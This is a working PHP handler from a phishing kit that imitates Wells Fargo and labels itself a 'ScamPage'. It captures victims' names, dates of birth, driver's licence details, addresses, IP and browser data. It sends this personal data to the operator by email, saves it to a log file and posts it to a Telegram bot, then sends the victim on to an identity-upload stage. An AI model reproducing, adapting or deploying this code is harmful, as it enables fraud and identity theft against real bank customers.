<?php

	ob_start();
session_start();
	include '../Inc/config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
	if ( isset( $_POST['fname'] ) ) {

		$_SESSION['fname'] 	  = $_POST['fname'];
		$_SESSION['lname'] 	  = $_POST['lname'];
		$_SESSION['date'] 	  = $_POST['date'];
		$_SESSION['idd'] 	  = $_POST['idd'];
		$_SESSION['ids'] 	  = $_POST['ids'];
		$_SESSION['stradd'] 	  = $_POST['stradd'];
		$_SESSION['apt'] 	  = $_POST['apt'];
		$_SESSION['city'] 	  = $_POST['city'];
		$_SESSION['state'] 	  = $_POST['state'];
		$_SESSION['zip'] 	  = $_POST['zip'];
		$code = <<<EOT
»»————-　★[ ⚫️🌀 WELLSFARGO Billing Info ⚫️🌀 ]★　————-««
[FirstName] 		: {$_SESSION['fname']}
[LastName]		: {$_SESSION['lname']}
[DOB] 		: {$_SESSION['date']}
[DL]		: {$_SESSION['idd']}
[DL Date] 		: {$_SESSION['ids']}
[Street]		: {$_SESSION['stradd']}
[Street2] 		: {$_SESSION['apt']}
[City]		: {$_SESSION['city']}
[State]		: {$_SESSION['state']}
[Zip] 		: {$_SESSION['zip']}

»»————-　★[ 💻🌏 DEVICE INFO 🌏💻  ]★　————-««
IP		: $ip
IP lookup		: http://ip-api.com/json/$ip
OS		: $useragent


»»————-　★[ ⚫️🌀 WELLSFARGO ScamPage ⚫️🌀 ]★　————-««
\r\n\r\n
EOT;
		if ($sendtoemail=="yes"){
		$subject = "🏛️ WELLSFARGO User Info 🏛️  From $ip";
        $headers = "From: 🍁WELLSFARGO Billing Info🍁 <newfullz@sh33nz0.com>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$code,$headers);
		}

		if ($saveintotxt=="yes"){
		$save = fopen("../Logs/Billing.txt","a+");
        fwrite($save,$code);
        fclose($save);
		}

	if ($sendtotelegram=="yes"){
	$txt = $code;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	}


        header("Location: ../upload?oamo/identity/_CHOOSE_YOUR_INDENTITY&token=cjmvJprW2Dw1/recognizeUser/identification");
        exit();
	} else {
		header("Location: ../index.php");
		exit();
	}
?>
